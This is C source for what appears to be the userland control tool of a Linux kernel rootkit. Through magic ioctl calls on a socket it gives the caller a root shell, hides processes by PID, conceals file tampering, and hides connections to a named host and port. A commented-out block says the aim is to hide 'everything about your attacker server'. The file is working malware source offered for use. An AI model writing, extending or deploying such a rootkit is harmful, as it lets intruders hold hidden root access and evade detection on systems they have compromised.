#include <arpa/inet.h>
#include <net/if.h>
#include <netdb.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#define SHELL "/bin/bash"

struct control {
	unsigned short cmd;
	void *argv;
};

int main(int argc, char **argv)
{
	int sockfd;
	struct control args;
	struct sockaddr_in addr;
	struct hostent *host;
	unsigned int pid;
	char *bash = SHELL;
	char *envp[1] = {NULL};
	char *arg[3] = {SHELL, NULL};

	if (argc < 2)
		exit(0);

	sockfd = socket(AF_INET, SOCK_STREAM, 6);
	if (sockfd < 0)
		goto fail;

	if (strcmp(argv[1], "root") == 0) {
		if (geteuid() == 0) {
			printf("You are already root! :)\n\n");
			close(sockfd);
			goto out;
		}

		args.cmd = 3;

		if (ioctl(sockfd, AUTH, HTUA) == 0) {
			ioctl(sockfd, AUTH, &args);
			ioctl(sockfd, AUTH, HTUA);
		}

		if (geteuid() == 0) {
			printf("\e[01;36mYou got super powers!\e[00m\n\n");
			execve(bash, arg, envp);
		} else {
			printf("\e[00;31mYou have no power here! :( \e[00m\n\n");
		}

		goto out;
	}

	if (strcmp(argv[1], "hide") == 0 || strcmp(argv[1], "show") == 0) {
		if (argc < 2)
			goto fail;

		if (argc == 2) {
			args.cmd = 0;

			if (ioctl(sockfd, AUTH, HTUA) == 0) {
				if (ioctl(sockfd, AUTH, &args) == 0) {
					if (ioctl(sockfd, AUTH, HTUA) == 0) {
						printf("\e[01;32mSuccess!\e[00m\n");
						goto out;
					}
				}
			}
		} else {

			args.cmd = 1;
			pid = (unsigned int)atoi(argv[2]);
			args.argv = &pid;

			if (ioctl(sockfd, AUTH, HTUA) == 0) {
				if (ioctl(sockfd, AUTH, &args) == 0) {
					if (ioctl(sockfd, AUTH, HTUA) == 0) {
						printf("\e[01;32mSuccess!\e[00m\n");
						goto out;
					}
				}
			}
		}
	}

	if (strcmp(argv[1], "file-tampering") == 0) {
		args.cmd = 2;

		if (ioctl(sockfd, AUTH, HTUA) == 0) {
			if (ioctl(sockfd, AUTH, &args) == 0) {
				if (ioctl(sockfd, AUTH, HTUA) == 0) {
					printf("\e[01;32mSuccess!\e[00m\n");
					goto out;
				}
			}
		}
	}

	if (strcmp(argv[1], "conn") == 0) {
		if (argc < 4)
			goto fail;

		if (strcmp(argv[4], "hide") == 0) {
			args.cmd = 4;
		} else if (strcmp(argv[4], "show") == 0) {
			args.cmd = 5;
		} else {
			goto fail;
		}

		host = gethostbyname(argv[2]);

		if (host == NULL)
			goto fail;

		memcpy((void *)&addr.sin_addr, (void *)host->h_addr,
		       host->h_length);

		addr.sin_family = AF_INET;
		addr.sin_port = htons(atoi(argv[3]));

		args.argv = &addr;

		if (ioctl(sockfd, AUTH, HTUA) == 0) {
			if (ioctl(sockfd, AUTH, &args) == 0) {
				if (ioctl(sockfd, AUTH, HTUA) == 0) {
					printf("\e[01;32mSuccess!\e[00m\n");
					goto out;
				}
			}
		}
	}
/*

// This part is deprecated. There is no reason to hide specific protocols
// when you want to hide some connection, in the most of cases you will 
// need to hide every connection and everything about your attacker server.

	if (strcmp(argv[1], "udp") == 0) {
		if (argc < 4)
			goto fail;

		if (strcmp(argv[4], "hide") == 0) {
			args.cmd = 6;
		} else if (strcmp(argv[4], "show") == 0) {
			args.cmd = 7;
		} else {
			goto fail;
		}

		host = gethostbyname(argv[2]);

		if (host == NULL)
			goto fail;

		memcpy((void *)&addr.sin_addr, (void *)host->h_addr,
		       host->h_length);

		addr.sin_family = AF_INET;
		addr.sin_port = htons(atoi(argv[3]));

		args.argv = &addr;

		if (ioctl(sockfd, AUTH, HTUA) == 0) {
			if (ioctl(sockfd, AUTH, &args) == 0) {
				if (ioctl(sockfd, AUTH, HTUA) == 0) {
					printf("\e[01;32mSuccess!\e[00m\n");
					goto out;
				}
			}
		}
	}
*/
fail:
	printf("\e[01;31mFailed!\e[00m\n");
out:
	close(sockfd);
	return 0;
}
